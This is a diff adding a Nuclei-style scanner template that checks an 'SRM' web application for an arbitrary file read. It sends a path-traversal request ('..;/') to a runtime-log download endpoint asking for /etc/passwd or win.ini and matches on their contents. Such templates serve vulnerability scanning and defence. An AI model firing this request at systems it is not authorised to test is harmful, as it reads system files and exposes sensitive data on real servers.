@@ -1,0 +1,26 @@
+id: srm-download-anyfile-read
+info:
+  name: SRM Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    SRM system download endpoint is vulnerable to arbitrary file read, allowing retrieval of sensitive files.
+
+variables:
+  files:
+    - "c:\\windows\\win.ini"
+    - "/etc/passwd"
+
+http:
+  - method: GET
+    path:
+      - "/adpweb/static/..;/a/sys/runtimeLog/download?path={{files}}"
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, 'bit app support') && contains(header['Content-Disposition'], 'filename=win.ini')"
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, 'root:') && contains(body, '/bin')"
